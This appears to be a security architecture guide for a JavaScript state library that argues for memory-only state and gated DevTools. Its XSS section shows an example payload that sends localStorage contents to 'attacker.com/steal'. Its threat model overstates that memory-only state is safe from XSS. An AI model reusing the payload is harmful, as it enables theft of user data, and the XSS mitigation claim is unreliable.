# @vi/state-fp — Security Architecture

## Core Principle: Memory-Only Application State

**@vi/state-fp enforces memory-only storage for all application state. This is a non-negotiable architectural decision, not an optional feature.**

## Why Browser Persistence is Forbidden

All browser-persistent storage mechanisms (localStorage, sessionStorage, IndexedDB) suffer from the same class of vulnerabilities that make them unsuitable for sensitive application data:

### 1. No Default Encryption

Data is stored in **plaintext (unencrypted)** on the user's hard drive. Anyone with physical access to the device can:
- Extract browser cache files directly (no browser launch required)
- Access SQLite files from IndexedDB stores
- Read cookie/localStorage database files from the file system

**Attack vector:** Malicious insider at an internet café, cloud VM, corporate workstation, or family device.

### 2. Plaintext in DevTools (Primary Concern)

Any user with 5 minutes of browser DevTools knowledge can inspect all application state:

```
Open DevTools → Application tab → Storage (IndexedDB/localStorage) → Browse all values
```

**This violates the principle of least privilege:**

- **Internal contractors** with DevTools access can read production secrets (API tokens, PII, auth state)
- **Disgruntled employees** can exfiltrate data before offboarding without administrator intervention
- **Social engineers** can trick users into opening DevTools and copying data
- **Third-party developers** working on components have access to all app secrets
- **Penetration testers** trivially access any stored secrets in a report

**Attack scenarios:**
- "Click DevTools, tab Application, copy everything" (no tools needed, works in 10 seconds)
- Compromised GitHub Actions secret accidentally storing secrets in localStorage
- Analytics script or ad network with XSS access to stored tokens
- Browser extension (legitimate or malicious) reading all IndexedDB values

### 3. Vulnerable to XSS (Cross-Site Scripting)

If a website is compromised via XSS, malicious JavaScript can read **ALL** data from browser storage for that origin:

```js
// Attacker's XSS payload (no special privileges needed)
const allData = JSON.stringify(localStorage);
const indexeddbKeys = indexedDB.databases(); // read all stores
// Send to attacker's server
fetch('https://attacker.com/steal', { method: 'POST', body: allData });
```

XSS attacks are common and don't require administrator access — just arbitrary code execution.

### 4. No Application-Level Access Control

Browser storage is protected only by Same-Origin Policy. **Within the same origin, ALL JavaScript has equal access:**
- Main application code
- Third-party analytics libraries
- Ad networks (Google DoubleClick, Facebook Pixel)
- Browser extensions
- Malicious polyfills or compromised npm packages

There is no way to partition "main app" storage from "third-party script" storage.

---

## How Other Libraries Handle This

**Redux** (development vs production):
```ts
// Development — full DevTools available
const composeEnhancers = window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__ || compose;
const store = createStore(reducer, composeEnhancers());

// Production — DevTools disabled entirely
// No localStorage persistence by default
// State is memory-only (ephemeral)
```

**NgRx** (development vs production):
```ts
// Development — StoreDevtoolsModule enabled
imports: [StoreDevtoolsModule.instrument({ maxAge: 25 })]

// Production — module not imported
// No DevTools bridge
// State is memory-only
```

**Zustand** (explicit opt-in for persistence):
```ts
// Memory-only by default
const store = create((set) => ({ count: 0 }));

// Explicit opt-in for persistence (developer must choose)
const store = create(
  persist(
    (set) => ({ count: 0 }),
    { name: 'my-store', storage: localStorage } // UNSAFE — must be non-sensitive
  )
);
```

**@vi/state-fp follows this pattern:**
- Memory-only by default (and only option)
- DevTools are dev-only (disabled in production via `process.env.NODE_ENV !== 'production'`)
- No browser persistence for sensitive app state
- Separate `@vi/config` library for non-sensitive config (theme, locale, feature flags)

---

## Architecture: Memory-Only Guarantee

### 1. Storage Guard

All attempts to use browser-persistent storage are blocked at runtime:

```ts
import { defineAtom } from '@vi/state-fp/kernel';
import { LocalAdapter } from '@vi/state-fp/storage'; // ❌ Not exported

// ❌ Compile error: LocalAdapter not available
const authAtom = defineAtom({
  key: 'auth',
  initialState: { token: null },
  storage: { adapter: new LocalAdapter() }, // TypeError: LocalAdapter is not exported
});
```

Even if a developer obtains `LocalAdapter` from elsewhere:

```ts
import { LocalAdapter } from '@vi/state-fp/src/storage/local'; // ❌ Dark imports

const authAtom = defineAtom({
  key: 'auth',
  initialState: { token: null },
  storage: { adapter: new LocalAdapter() },
  // ❌ Runtime error: FORBIDDEN storage adapter "local"
});
```

**Defense layers:**
1. **Compile-time**: Forbidden adapters not exported from public API
2. **Runtime**: `assertApplicationStoragePolicy()` fires on atom registration
3. **Enforcement points**: kernel.register, kernel.registerAsync, kernel.registerQuery, kernel.hydrate, kernel.writeToStorage

### 2. DevTools Separation

DevTools plugin is environment-gated:

```ts
// app/kernel.ts
import { createKernel } from '@vi/state-fp/kernel';
import { createDevTools, noopDevTools, attachBridge } from '@vi/state-fp/devtools';

const isProduction = process.env['NODE_ENV'] === 'production';

export const kernel = createKernel({
  devtools: isProduction
    ? noopDevTools      // ← Zero-overhead no-op (tree-shaken in build)
    : createDevTools()  // ← Full debug stack (dev-only)
});

// Bridge not attached in production
if (!isProduction && typeof window !== 'undefined') {
  attachBridge(kernel.devtools); // ← window.__VI_STATE_FP__ created
}
```

**Production build result:**
- All `createDevTools()` code is dead-code eliminated (tree-shaken)
- `attachBridge()` code never ships to production browser
- `window.__VI_STATE_FP__` does not exist
- **State is completely invisible to DevTools** in production

### 3. Comparable to Redux/NgRx Safety

| Feature | Redux/NgRx | @vi/state-fp |
|---------|------------|--------------|
| Default storage | Memory only | Memory only |
| Persistent adapters available | Explicit plugin required | Not available |
| DevTools in production | No (disabled) | No (noopDevTools) |
| DevTools code shipping to prod | No (tree-shaken) | No (tree-shaken) |
| Runtime guard on persistence | N/A (requires plugin) | assertApplicationStoragePolicy() |
| Sensitive data accessible in DevTools (prod) | No | No |

---

## For Non-Sensitive Configuration

**@vi/state-fp is purpose-built for sensitive application state.** For non-sensitive configuration (theme, locale, feature flags), use the separate `@vi/config` library:

```ts
// Application state — @vi/state-fp (memory-only)
const authAtom = defineAtom({
  key: 'auth',
  initialState: { token: null, userId: null },
  // ← No storage = memory-only (REQUIRED)
});

// User preferences — @vi/config (can use browser persistence)
const preferencesConfig = createConfig({
  key: 'user/preferences',
  initialState: { theme: 'light', locale: 'en' },
  storage: new LocalAdapter(), // ✅ Safe: non-sensitive data
});
```

**Characteristics of config-suitable data:**
- ✅ No secrets (API keys, tokens, auth state)
- ✅ No PII (email, user ID, passwords)
- ✅ Survives page reloads (feature flags, theme)
- ✅ Acceptable if cached (locale, UI state)
- ✅ User-specific but not sensitive

---

## Threat Model

| Threat | Attack Vector | @vi/state-fp Mitigation |
|--------|---------------|--------------------------|
| **Malicious insider** | Physical access → DevTools | Memory-only: no plaintext on disk; state cleared on reload |
| **Disgruntled employee** | DevTools → copy secrets | DevTools disabled in production ( noopDevTools); dev-only bridge |
| **XSS/Malicious script** | Arbitrary JS → localStorage read | No localStorage; memory-only (inaccessible to malware) |
| **Web app compromise** | Compromised npm package → steal secrets | Runtime guard blocks usage; export lockdown; dev-only storage |
| **Social engineering** | "Open DevTools and copy data" | DevTools not available in production (user can't comply) |
| **Browser extension** | Third-party code → read storage | No persistent storage to read; memory-only invisible |
| **Physical device theft** | Attacker gets device → browse cache | IndexedDB plaintext inaccessible (not implemented); memory-only (ephemeral) |

---

## Implementation Checklist

- ✅ MemoryAdapter only in public API (`@vi/state-fp/storage`)
- ✅ Forbidden adapters (Local, Session, IndexedDB, Obfuscated) removed from source
- ✅ Runtime guard (`assertApplicationStoragePolicy`) on all registration paths
- ✅ DevTools conditional: `createDevTools()` in dev, `noopDevTools` in prod
- ✅ Bridge gated: `attachBridge()` only when `process.env.NODE_ENV !== 'production'`
- ✅ Documentation: Storage module, security policy, architecture guide
- ✅ No browser persistence in type definitions (no StorageAdapter with web storage)

---

## References

- [OWASP: Sensitive Data Exposure](https://owasp.org/www-community/Sensitive_Data_Exposure)
- [MDN: Web Storage API Security](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API#security)
- [Redux: Redux DevTools Production Safety](https://redux.js.org/tutorials/fundamentals/part-8-modern-redux#redux-toolkit-overview)
- [NgRx: Store DevTools](https://ngrx.io/guide/store-devtools)
- [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)

---

## Questions?

This is a **non-negotiable architectural constraint**, not a limitation to be worked around. If you need persistent storage for sensitive data:

1. **Validate with security/compliance team** — sensitive data should never persist in the browser
2. **Consider @vi/config** — for non-sensitive configuration
3. **Use server-side sessions** — authentication and sensitive app state belong on the server
4. **Use IndexedDB in @vi/config** — explicitly designed for safe persistence of non-sensitive data

Contact the @vi/state-fp team with security concerns before suggesting changes to this policy.
